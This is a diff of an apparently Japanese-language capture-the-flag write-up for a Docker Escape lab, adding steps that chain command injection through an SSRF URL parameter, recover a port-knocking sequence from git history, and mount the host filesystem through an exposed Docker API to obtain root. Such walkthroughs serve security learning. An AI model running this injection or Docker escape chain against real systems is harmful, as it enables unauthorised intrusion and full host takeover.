@@ -289,7 +289,7 @@ An error occurred: File format could not be determined
 * Connection #0 to host 10.10.101.43 left intact
 ```
 
-何かのパスワードが書かれたファイルがあった。
+何かのパスワードが書かれたファイルがあった。しかし使いどころは不明。
 
 ```sh
 $ curl "http://10.10.101.43/api/exif?url=http://api-dev-backup:8080/exif?url=1;cat%20/root/dev-note.txt"
@@ -310,33 +310,149 @@ Cheers,
 Hydra
 ```
 
-続きは後日。
+/root に .git ディレクトリがある。
 
-## 権限昇格
+git log
+
+```
+commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
+Author: Hydra <hydragyrum@example.com>
+Date:   Thu Jan 7 16:48:58 2021 +0000
+
+    fixed the dev note
+
+commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+Author: Hydra <hydragyrum@example.com>
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Removed the flag and original dev note b/c Security
+
+commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
+Author: Hydra <hydragyrum@example.com>
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Added the flag and dev notes
+* Connection #0 to host 10.10.39.222 left intact
+```
+
+git diff a3d30a7d0510dc6565ff9316e3fb84434916dee8
+
+```
+                Retrieved Content
+                ----------------------------------------
+                An error occurred: File format could not be determined
+               Retrieved Content
+               ----------------------------------------
+               diff --git a/dev-note.txt b/dev-note.txt
+index 89dcd01..efadf5b 100644
+--- a/dev-note.txt
++++ b/dev-note.txt
+@@ -1,8 +1,8 @@
+ Hey guys,
+
+-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
++Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
++Anyways, the password is [REDACTED]
+
+ Cheers,
+
+diff --git a/flag.txt b/flag.txt
+deleted file mode 100644
+index aae8129..0000000
+--- a/flag.txt
++++ /dev/null
+@@ -1,3 +0,0 @@
+-You found the root flag, or did you?
+-
+-THM{.................................}
+\ No newline at end of file
+* Connection #0 to host 10.10.39.222 left intact
+```
+
+ゲストルートフラグ入手。
+
+## Docker エスケープ
+
+フラグと一緒にポートノッキングのヒントが書かれていた。
+
+```
+-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+```
+
+```sh
+knock -d 100 10.10.39.222 42 1337 10420 6969 63000
+```
+
+では開かなかった。telnet で開いた。TCP SYN だけではノックとみなされなかった？
+
+```sh
+telnet 10.10.39.222 42
+telnet 10.10.39.222 1337
+telnet 10.10.39.222 10420
+telnet 10.10.39.222 6969
+telnet 10.10.39.222 63000
+```
+
+ポートスキャン。Docker エンジンの 2375 ポートが開いた。
+
+```sh
+root@ip-10-10-182-216:~# sudo nmap -sS -p- 10.10.39.222
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-13 05:41 BST
+Nmap scan report for 10.10.39.222
+Host is up (0.00041s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2375/tcp open  docker
+MAC Address: 02:77:A2:F9:5E:0B (Unknown)
+```
+
+リモート実行可能。
+
+```sh
+$ docker -H tcp://10.10.39.222:2375 ps
+CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS          PORTS                  NAMES
+49fe455a9681   frontend       "/docker-entrypoint.…"   4 years ago   Up 41 minutes   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
+4b51f5742aad   exif-api-dev   "./application -Dqua…"   4 years ago   Up 41 minutes                          dockerescapecompose_api-dev-backup_1
+cb83912607b9   exif-api       "./application -Dqua…"   4 years ago   Up 41 minutes   8080/tcp               dockerescapecompose_api_1
+548b701caa56   endlessh       "/endlessh -v"           4 years ago   Up 41 minutes   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
+```
+
+イメージを列挙。
+
+```sh
+$ docker -H tcp://10.10.39.222:2375 images
+REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
+exif-api-dev                                  latest    4084cb55e1c7   4 years ago   214MB
+exif-api                                      latest    923c5821b907   4 years ago   163MB
+frontend                                      latest    577f9da1362e   4 years ago   138MB
+endlessh                                      latest    7bde5182dc5e   4 years ago   5.67MB
+nginx                                         latest    ae2feff98a0c   4 years ago   133MB
+debian                                        10-slim   4a9cd57610d6   4 years ago   69.2MB
+registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   4 years ago   103MB
+alpine                                        3.9       78a2ce922f86   5 years ago   5.55MB
+```
+
+alpine はローカルにイメージが無くエラーになったので、frontend を使用してホスト OS のシェルを取る。
+
+```sh
+$ docker -H tcp://10.10.39.222:2375 run -v /:/mnt --rm -it frontend chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```sh
+# cat /root/flag.txt
+Congrats, you found the real flag!
+
+THM{..................................}
+```
 
 ## 振り返り
 
--
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
+- 全体的に機械的なファジングが無効化されて、ひらめきが必要なタイプのギャップが多く、非常に難しく感じた。
+- `/.well-known/security.txt` は知らなかったので覚えておく。
+- telnet を使ってポートノッキングができることを学んだ。
